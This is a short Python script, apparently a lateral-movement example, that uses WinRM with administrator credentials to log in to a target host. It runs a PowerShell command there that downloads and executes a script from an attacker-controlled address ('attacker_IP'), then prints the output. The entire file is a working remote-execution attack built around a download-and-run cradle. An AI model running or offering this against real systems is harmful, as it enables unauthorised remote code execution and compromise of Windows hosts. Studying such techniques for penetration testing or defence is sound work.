import winrm

s = winrm.Session('target_IP', auth=('administrator', 'password'))
r = s.run_cmd('powershell -c "IEX((New-Object System.Net.WebClient).DownloadString(\'http://attacker_IP/Invoke-HelloWorld.ps1\'))"')

print r.status_code
print r.std_out
print r.std_err
